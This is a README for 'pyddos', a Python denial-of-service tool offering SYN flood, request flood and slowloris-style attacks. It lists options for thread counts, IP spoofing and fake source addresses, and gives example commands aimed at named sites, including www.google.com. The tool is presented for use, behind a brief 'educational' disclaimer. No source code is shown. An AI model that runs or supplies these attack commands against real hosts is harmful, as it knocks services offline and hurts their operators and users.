# pyddos.py

* This is my new update 
* This script have 3 type of ddos attack : SYNFLOOD | REQUEST | Pyslow
* Script has pyslow attack type which same like slowloris attack

# Note
* I worte this script for educational not for destructive purposes and illegal actions,so i won't responsible for that  

# Usage
       
      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
           
    usage: ./pyddos -d [target] [option]

    optional arguments:
    -h, --help       show this help message and exit
    -v, --version    show program's version number and exit

    options:

    -d <ip|domain>   Specify your target such an ip or domain name
    -t <float>       Set timeout for socket
    -T <int>         Set threads number for connection (default = 1000)
    -p <int>         Specify port target (default = 80) |Only required with pyslow attack|           
    -s <int>         Set sleep time for reconnection                                                  
    -i <ip address>  Specify spoofed ip unless use fake ip                                            
    --fakeip         Option to create fake ip if not specify spoofed ip
    --request        Enable request target
    --synflood       Enable synflood attack
    --pyslow         Enable pyslow attack

    Example:
    ./pyddos -d www.example.com -p 80 -T 2000 --pyslow
    ./pyddos -d www.domain.com --request
    ./pyddos -d www.google.com --synflood -T 5000 -t 10.0

